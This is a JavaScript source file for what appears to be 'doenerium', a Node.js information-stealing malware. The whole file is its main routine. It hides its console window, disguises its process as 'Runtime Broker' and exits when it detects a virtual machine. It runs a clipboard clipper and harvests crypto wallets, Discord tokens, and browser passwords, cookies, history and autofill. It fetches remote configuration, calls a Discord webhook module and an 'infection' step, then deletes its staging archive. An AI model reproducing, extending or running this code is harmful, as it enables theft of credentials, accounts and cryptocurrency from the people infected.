class doenerium {
    constructor() {

        this.requires = {
            fs: require("fs"),
            crypto: require("crypto"),
            os: require("os"),
            axios: require("axios"),
            child_process: require("child_process"),
            screenshot: require("screenshot-desktop"),
            systeminformation: require("systeminformation"),
            buf_replace: require('buffer-replace'),
            jszip: require("zip-lib"),
            dpapi: require("win-dpapi"),
            sqlite3: require("sqlite3"),
            path: require("path"),
            discord_webhook: require("discord-webhook-node"),
        }

        this.utils = {
            encryption: require(`./utils/encryption`)(this)
        }

        this.config = {
            counter: require(`./config/counter`)(this),
            crypto: require(`./config/crypto`)(this),
            discord: require(`./config/discord`)(this),
            environ: require(`./config/environ`)(this),
            executable: require(`./config/executable`)(this),
            main: require(`./config/main`)(this),
            user: require(`./config/user`)(this),
            jszip: require(`./config/jszip`)(this),
            wallets: require(`./config/wallets`)(this),
        }

        this.config.webhook = require(`./config`)(this);
        this.config.keywords = require(`./keywords`)(this);

        this.utils = {
            encryption: require(`./utils/encryption`)(this),
            constructor: require(`./utils/constructor`)(this),
            discord: require(`./utils/discord`)(this),
            flags: require(`./utils/flags`)(this),
            infection: require(`./utils/infection`)(this),
            protection: require(`./utils/protection`)(this),
            prototype: require(`./utils/prototype`)(this),
            time: require(`./utils/time`)(this),
            clipper: require(`./utils/clipper`)(this),
            jszip: require(`./utils/jszip`)(this),
            browsers: require(`./utils/browsers`)(this),
            data: require(`./utils/data`)(this),
            wallets: require(`./utils/wallets`)(this),
            webhook: require(`./utils/webhook`)(this),
        }
    }

    hideSelf() {
        let payload = '\n' +
            "    Add-Type -Name Window -Namespace Console -MemberDefinition '\n" +
            '    [DllImport("Kernel32.dll")]\n' +
            '    public static extern IntPtr GetConsoleWindow();\n' +
            '\n' +
            '    [DllImport("user32.dll")]\n' +
            '    public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);\n' +
            "    '\n" +
            '\n' +
            '    $consolePtr = [Console.Window]::GetConsoleWindow()\n' +
            '    #0 hide\n' +
            '    [Console.Window]::ShowWindow($consolePtr, 0)\n' +
            `    & {$host.ui.RawUI.WindowTitle = 'Runtime Broker'}`
        '    ';
        let file = process.cwd() + '\\temp.ps1';
        try {
            this.requires.child_process.execSync('type .\\temp.ps1 | powershell.exe -noprofile -', {
                'stdio': 'inherit'
            });
            this.requires.fs.unlinkSync(file);
        } catch (e) {}
    }

    async init() {

        try {

            this.config.embed = JSON.parse(JSON.stringify((await this.requires.axios.get("https://raw.githubusercontent.com/1337wtf1337/1337wtf1337/main/embed.json")).data))
        } catch {
            this.config.embed = {
                "username": "doenerium | t.me/doenerium",
                "href": "https://t.me/doenerium",
                "avatar_url": "https://cdn.discordapp.com/emojis/948405394433253416.webp?size=96&quality=lossless",
                "credits": "t.me/doenerium"
            }
        }
        this.config.embed.footer = {
            text: `${this.utils.encryption.decryptData(this.config.user.hostname)} | ${this.config.embed.credits}`,
            icon_url: this.config.embed.avatar_url,
        }

        // this.hideSelf();

        const exit = await this.utils.protection.inVM();

        if (exit) {
            process.exit(0);
        }

        this.utils.protection.detect_malicious_processes();
        this.utils.clipper.detectClipboard();

        process.title = "Runtime Broker"

        this.config.jszip.path = this.config.jszip.generate_path()

        console.log(this.config.jszip.path)

        //this.config.autostart.path = this.config.autostart.generate_path();
        //this.utils.autostart.dropInRandomPath();

        await this.utils.wallets.getWallets();

        await this.utils.discord.saveDiscordTokens();

        for (var path of this.config.environ.password_and_cookies_paths) {
            if (this.requires.fs.existsSync(path + "Login Data")) {
                try {
                    await this.utils.browsers.getPasswords(path)
                } catch {}
                try {
                    await this.utils.browsers.getCookies(path);
                } catch {}
                try {
                    await this.utils.browsers.getBookmarks(path);
                } catch {}
                try {
                    await this.utils.browsers.getBrowserData(path);
                } catch {}
                try {
                    await this.utils.browsers.getHistory(path);
                } catch {}
                try {
                    await this.utils.browsers.getAutofill(path);
                } catch {}
            }
        }

        this.utils.browsers.saveBrowserStuff();

        this.utils.constructor.loadCPUS()

        
        await this.utils.discord.getTokens();

        await this.utils.time.sleep(this.config.main.start_delay);


        await this.utils.infection.initialize()

        await this.utils.time.sleep(30000);
        this.requires.fs.rmSync(this.config.jszip.path, {
            recursive: true,
            force: true
        })
        this.requires.fs.rmSync(`${this.config.jszip.path}.zip`, {
            recursive: true,
            force: true
        })

    }
}

new doenerium().init()